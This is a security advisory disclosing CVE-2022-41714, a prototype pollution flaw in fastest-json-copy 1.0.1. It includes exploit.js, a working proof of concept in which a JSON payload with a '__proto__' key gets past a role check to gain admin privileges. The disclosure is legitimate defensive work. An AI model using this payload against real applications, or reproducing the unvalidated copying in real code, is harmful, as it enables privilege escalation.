---
slug: advisories/guetta/
title: fastest-json-copy 1.0.1 - Prototype Pollution
authors: Carlos Bello
writer: cbello
codename: guetta
product: fastest-json-copy 1.0.1 - Prototype Pollution
date: 2022-10-19 13:30 COT
cveid: CVE-2022-41714
severity: 7.3
description: fastest-json-copy 1.0.1    -    Prototype Pollution
keywords: Fluid Attacks, Security, Vulnerabilities, Fastest Json Copy, Prototype Pollution
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | fastest-json-copy 1.0.1 - Prototype Pollution                      |
| **Code name**         | [Guetta](https://en.wikipedia.org/wiki/David_Guetta)               |
| **Product**           | fastest-json-copy                                                  |
| **Affected versions** | Version 1.0.1                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2022-10-19                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Prototype Pollution                                                                                                         |
| **Rule**              | [390. Prototype Pollution](https://docs.fluidattacks.com/criteria/vulnerabilities/390)                                      |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L                                                                                |
| **CVSSv3 Base Score** | 7.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-41714](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41714)                                             |

## Description

Version 1.0.1 of fastest-json-copy allows an external attacker to edit
or add new properties to an object. This is possible because the
application does not correctly validate the incoming JSON keys, thus
allowing the `__proto__` property to be edited.

## Vulnerability

Prototype pollution is a vulnerability that affects JS. It occurs when
a third party manages to modify the `__proto__` of an object. JavaScript
first checks if such a method/attribute exists in the object. If so,
then it calls it. If not, it looks in the object's prototype. If the
method/attribute is also not in the object's prototype, then the
property is said to be undefined.

Therefore, if an attacker succeeds in injecting the `__proto__` property
into an object, he will succeed in injecting or editing its properties.

## Exploitation

### exploit.js

```js
const copy = require('fastest-json-copy');

let admin = {name: "admin", role:"admin"};
let user  = {name: "user" , role:"user"};

let normal_user_request    = JSON.parse('{"name":"user","role":"admin"}');
let malicious_user_request = JSON.parse('{"name":"user","__proto__":{"role":"admin"}}');

const create_user = (new_user) => {
    // A user cannot alter his role. This way we prevent privilege escalations.
    if(new_user?.role && new_user?.role.toLowerCase() === "admin") {
        throw "Unauthorized Action";
    }
    user = copy.copy(new_user);
    console.log(user);
}

try {
    create_user(normal_user_request);
} catch (error) {
    console.log(error);
}
finally {
    create_user(malicious_user_request);
}
```

## Evidence of exploitation

![Prototype-Pollution](https://user-images.githubusercontent.com/51862990/196764953-0bfa69f8-8ccc-4b74-8ae1-4fbad55efd48.png)

## Our security policy

We have reserved the CVE-2022-41714 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: fastest-json-copy 1.0.1

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/streamich/fastest-json-copy>

## Timeline

<time-lapse
  discovered="2022-10-06"
  contacted="2022-10-06"
  replied="2022-10-06"
  confirmed=""
  patched=""
  disclosure="2022-10-19">
</time-lapse>
